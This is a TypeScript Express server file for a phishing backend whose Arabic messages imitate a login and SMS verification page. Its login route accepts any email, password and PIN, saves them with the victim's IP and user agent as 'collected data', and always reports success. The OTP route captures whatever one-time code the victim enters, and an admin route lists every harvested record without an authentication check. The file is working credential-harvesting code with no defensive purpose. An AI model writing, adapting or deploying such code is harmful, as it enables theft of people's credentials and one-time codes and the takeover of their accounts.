import type { Express, Request } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { loginSchema, verifyOtpSchema, adminLoginSchema } from "@shared/schema";

// Store temporary collected data IDs for SMS verification
const tempCollectedIds = new Map<string, string>();

function getClientIp(req: Request): string {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string') {
    return forwarded.split(',')[0].trim();
  }
  return req.socket.remoteAddress || 'unknown';
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Login endpoint - accepts ANY credentials and saves to database
  app.post("/api/auth/login", async (req, res) => {
    try {
      const validatedData = loginSchema.parse(req.body);
      const { email, password, pin } = validatedData;

      const ipAddress = getClientIp(req);
      const userAgent = req.headers['user-agent'] || 'unknown';

      // Save collected data to database
      const collectedDataRecord = await storage.createCollectedData({
        email,
        password,
        pin,
        smsCode: null,
        ipAddress,
        userAgent,
      });

      // Store the collected data ID temporarily for SMS verification
      const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      tempCollectedIds.set(sessionId, collectedDataRecord.id);

      console.log(`✅ Login data saved to database for: ${email}`);

      // Always return success
      res.json({ 
        success: true, 
        userId: sessionId,
        message: "تم إرسال رمز التحقق إلى هاتفك" 
      });
    } catch (error: any) {
      console.error("Login error:", error);
      res.status(400).json({ message: error.message || "خطأ في البيانات المدخلة" });
    }
  });

  // Verify OTP endpoint - accepts ANY SMS code and saves to database
  app.post("/api/auth/verify-otp", async (req, res) => {
    try {
      const validatedData = verifyOtpSchema.parse(req.body);
      const { userId, otp } = validatedData;

      // Get collected data ID
      const collectedDataId = tempCollectedIds.get(userId);
      
      if (!collectedDataId) {
        return res.status(401).json({ message: "الجلسة منتهية، يرجى تسجيل الدخول مجدداً" });
      }

      // Update collected data with SMS code
      await storage.updateCollectedDataSms(collectedDataId, otp);

      console.log(`✅ SMS code saved to database - Code: ${otp}`);

      // Clean up temporary session
      tempCollectedIds.delete(userId);

      // Always return success
      res.json({ 
        success: true,
        message: "تم التحقق بنجاح" 
      });
    } catch (error: any) {
      console.error("OTP verification error:", error);
      res.status(400).json({ message: error.message || "خطأ في التحقق" });
    }
  });

  // Admin login endpoint
  app.post("/api/admin/login", async (req, res) => {
    try {
      const validatedData = adminLoginSchema.parse(req.body);
      const { username, password } = validatedData;

      const admin = await storage.getAdminByUsername(username);
      
      if (!admin || admin.password !== password) {
        return res.status(401).json({ message: "اسم المستخدم أو كلمة المرور غير صحيحة" });
      }

      res.json({ 
        success: true,
        admin: {
          id: admin.id,
          username: admin.username,
          role: admin.role,
        }
      });
    } catch (error: any) {
      console.error("Admin login error:", error);
      res.status(400).json({ message: error.message || "خطأ في تسجيل الدخول" });
    }
  });

  // Get all collected data (admin only)
  app.get("/api/admin/collected-data", async (req, res) => {
    try {
      const data = await storage.getAllCollectedData();
      res.json({ success: true, data });
    } catch (error: any) {
      console.error("Error fetching collected data:", error);
      res.status(500).json({ message: "خطأ في جلب البيانات" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
